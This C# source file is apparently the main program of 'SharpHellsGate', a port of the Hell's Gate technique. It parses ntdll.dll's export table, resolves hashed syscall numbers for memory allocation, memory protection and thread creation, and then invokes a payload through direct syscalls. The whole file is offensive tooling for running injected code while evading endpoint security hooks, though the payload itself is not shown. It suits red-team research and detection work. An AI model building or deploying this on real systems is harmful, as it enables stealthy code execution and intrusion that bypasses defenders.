using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace SharpHellsGate {

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct VxTableEntry {
        public ulong Hash;
        public byte Low;
        public byte High;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct VxTable {
        public VxTableEntry NtAllocateVirtualMemory;
        public VxTableEntry NtProtectVirtualMemory;
        public VxTableEntry NtCreateThreadEx;
        public VxTableEntry NtWaitForSingleObject;
    }

    public class Program {

        public static short IMAGE_DOS_SIGNATURE { get; } = 0x5a00 | 0x4D;        // MZ
        public static int IMAGE_NT_SIGNATURE { get; } = 0x00004500 | 0x00000050; // PE00

        static void Main(string[] args) {
            Generic.LogInfo("Copyright (C) 2020 Paul Laine (@am0nsec)");
            Generic.LogInfo("C# Implementation of the Hell's Gate VX Technique");
            Console.WriteLine("   --------------------------------------------------\n");

            // Only tested on x86
            if (IntPtr.Size != 8) {
                Generic.LogError("Project only tested in x64 context.\n");
                return;
            }

            // Get module
            if (!File.Exists(Environment.SystemDirectory + "\\ntdll.dll")) {
                Generic.LogError("Unable to find NTDLL module.\n");
                return;
            }
            MemoryUtil MemUtil = new MemoryUtil(File.ReadAllBytes(Environment.SystemDirectory + "\\ntdll.dll"));

            // Get DOS HEADER
            Win32.IMAGE_DOS_HEADER ImageDOSHeader = MemUtil.GetStructureFromBlob<Win32.IMAGE_DOS_HEADER>(0);
            if (ImageDOSHeader.Equals(default(Win32.IMAGE_DOS_HEADER)) || ImageDOSHeader.e_magic != IMAGE_DOS_SIGNATURE) {
                Generic.LogError("Invalid DOS Header.");
                return;
            }

            // Get NT Headers
            Win32.IMAGE_NT_HEADERS64 ImageNTHeaders = MemUtil.GetStructureFromBlob<Win32.IMAGE_NT_HEADERS64>(ImageDOSHeader.e_lfanew);
            if (ImageNTHeaders.Equals(default(Win32.IMAGE_NT_HEADERS64)) || ImageNTHeaders.Signature != IMAGE_NT_SIGNATURE) {
                Generic.LogError("Invalid NT Headers.");
                return;
            }

            // Sections
            Win32.IMAGE_SECTION_HEADER ImageSection = new Win32.IMAGE_SECTION_HEADER();
            List<Win32.IMAGE_SECTION_HEADER> ImageSectionHeaders = new List<Win32.IMAGE_SECTION_HEADER>(ImageNTHeaders.FileHeader.NumberOfSections);
            for (int cx = 0; cx < ImageNTHeaders.FileHeader.NumberOfSections; cx++) {
                long iSectionOffset = Generic.GetSectionOffset(ImageDOSHeader.e_lfanew, ImageNTHeaders.FileHeader.SizeOfOptionalHeader, cx);

                ImageSection = MemUtil.GetStructureFromBlob<Win32.IMAGE_SECTION_HEADER>(iSectionOffset);
                if (!ImageSection.Equals(default(Win32.IMAGE_SECTION_HEADER))) {
                    ImageSectionHeaders.Add(ImageSection);
                }
            }

            // Get the section in which the EAT RVA points
            int ivaImageExportTable = ImageNTHeaders.OptionalHeader.DataDirectory[0].VirtualAddress;
            long OffsetImageExportDirectory = Generic.ConvertRvaToOffset(ivaImageExportTable, ImageSectionHeaders);

            Win32.IMAGE_EXPORT_DIRECTORY ImageExportDirectory = MemUtil.GetStructureFromBlob<Win32.IMAGE_EXPORT_DIRECTORY>(OffsetImageExportDirectory);
            if (ImageExportDirectory.Equals(default(Win32.IMAGE_EXPORT_DIRECTORY))) {
                Generic.LogError("Invalid EAT.");
                return;
            }

            // Parse all functions
            long PtrToFunctionNames = Generic.ConvertRvaToOffset(ImageExportDirectory.AddressOfNames, ImageSectionHeaders);
            long PtrToFunctions = Generic.ConvertRvaToOffset(ImageExportDirectory.AddressOfFunctions, ImageSectionHeaders);

            // Load the table
            VxTable Table = new VxTable();
            Table.NtAllocateVirtualMemory.Hash = 0xf5bd373480a6b89b;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtAllocateVirtualMemory, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtAllocateVirtualMemory: 0x{Generic.HighLowToSystemCall(Table.NtAllocateVirtualMemory):x4}");

            Table.NtCreateThreadEx.Hash = 0x64dc7db288c5015f;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtCreateThreadEx, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtCreateThreadEx:        0x{Generic.HighLowToSystemCall(Table.NtCreateThreadEx):x4}");

            Table.NtProtectVirtualMemory.Hash = 0x858bcb1046fb6a37;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtProtectVirtualMemory, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtProtectVirtualMemory:  0x{Generic.HighLowToSystemCall(Table.NtProtectVirtualMemory):x4}");

            Table.NtWaitForSingleObject.Hash = 0xc6a2fa174e551bcb;
            Generic.GetVxTableEntry(ref MemUtil, ref Table.NtWaitForSingleObject, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
            Generic.LogInfo($"NtWaitForSingleObject:   0x{Generic.HighLowToSystemCall(Table.NtWaitForSingleObject):x4}\n");

            // Execute payload
            MemUtil.Dispose();
            HellsGate gate = new HellsGate(Table);
            gate.Payload();
        }
    }
}
